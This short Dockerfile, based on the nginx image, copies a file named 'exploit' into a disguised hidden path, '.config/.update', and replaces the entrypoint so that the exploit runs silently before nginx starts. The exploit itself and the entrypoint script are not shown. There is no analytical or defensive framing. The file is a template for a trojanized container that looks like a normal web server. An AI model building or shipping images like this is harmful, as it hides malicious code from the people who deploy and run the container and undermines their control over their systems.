FROM nginx

# 1) Copy the exploit into a “hidden” path and make it executable
COPY exploit /usr/local/bin/.config/.update
RUN chmod +x /usr/local/bin/.config/.update

# 2) Add a custom entrypoint that will launch both the exploit (silently)
#    and then launch nginx in the foreground
COPY entrypoint.sh /usr/local/bin/entrypoint.sh
RUN chmod +x /usr/local/bin/entrypoint.sh

# 3) Override the default nginx entrypoint/CMD
ENTRYPOINT ["/usr/local/bin/entrypoint.sh"]
CMD ["nginx", "-g", "daemon off;"]